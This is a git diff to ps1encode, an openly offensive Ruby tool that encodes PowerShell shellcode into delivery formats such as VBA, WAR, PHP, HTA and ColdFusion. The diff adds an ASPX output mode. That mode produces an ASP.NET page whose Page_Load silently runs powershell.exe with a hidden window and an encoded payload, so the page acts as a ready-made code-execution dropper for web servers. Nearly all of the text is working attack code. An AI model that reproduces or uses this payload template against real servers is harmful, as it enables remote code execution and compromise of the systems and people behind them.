@@ -19,6 +19,7 @@
 # => php (for use with php pages)
 # => hta (HTML applications)
 # => cfm (for use with Adobe ColdFusion)
+# => aspx (for use with ASP.NET)
 #
 #    Powershell code based on PowerSploit written by Matthew Graeber and SET by Dave Kennedy
 #     DETAILS - http://rvnsec.wordpress.com/2014/09/01/ps1encode-powershell-for-days/
@@ -51,7 +52,7 @@ optparse = OptionParser.new do|opts|
                 options[:PAYLOAD] = a
         end
 
-    opts.on('-t', '--ENCODE VALUE', "Output format: raw, cmd, vba, war, exe, java, php, hta, cfm") do |t|
+    opts.on('-t', '--ENCODE VALUE', "Output format: raw, cmd, vba, war, exe, java, php, hta, cfm, aspx") do |t|
                 options[:ENCODE] = t
         end
     opts.separator ""
@@ -362,6 +363,28 @@ cfmTEMPLATE = %{<cfexecute name = "C:\\Windows\\System32\\cmd.exe"
 }
 
 puts cfmTEMPLATE
+
+end
+
+######################ASPX_ENCODE##############################
+if $lencode == "aspx"
+
+powershell_encoded = gen_PS_shellcode()
+
+aspxTEMPLATE = %{
+<%@ Page Language="C#" AutoEventWireup="true" %>
+<%@ Import Namespace="System.Diagnostics" %>
+<script runat="server">
+	private void Page_Load(object sender, System.EventArgs e){
+		System.Diagnostics.Process process = new System.Diagnostics.Process();
+		process.StartInfo.FileName = "powershell.exe";
+		process.StartInfo.Arguments = " -nop -win Hidden -noni -enc #{powershell_encoded}";
+		process.Start();
+	}
+</script>
+}
+
+puts aspxTEMPLATE
 
 end
 
